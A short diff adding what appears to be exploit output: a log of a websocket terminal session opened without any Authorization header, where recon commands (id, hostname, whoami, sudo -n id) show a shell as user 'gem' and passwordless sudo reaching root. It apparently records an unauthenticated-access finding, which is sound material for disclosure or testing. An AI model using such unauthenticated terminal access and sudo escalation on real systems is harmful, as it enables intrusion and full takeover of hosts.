@@ -1,0 +1,3 @@
+[+] session_id=0ca7745f-4eea-48c6-b76a-3d03ed19dab5
+[+] websocket 101, no Authorization header
+{"type": "output", "data": "\r\u001b[Kgem@010cc46444a4:~$ "}{"type": "output", "data": "id; hostname; whoami; sudo -n id\r\n\u001b[?2004l\r"}{"type": "output", "data": "uid=1000(gem) gid=1000(gem) groups=1000(gem)\r\n"}{"type": "output", "data": "010cc46444a4\r\n"}{"type": "output", "data": "gem\r\n"}{"type": "output", "data": "uid=0(root) gid=0(root) groups=0(root)\r\n"}{"type": "output", "data": "\u001b[?2004hgem@010cc46444a4:~$ "}{"type": "ping", "timestamp": 1795293249250}
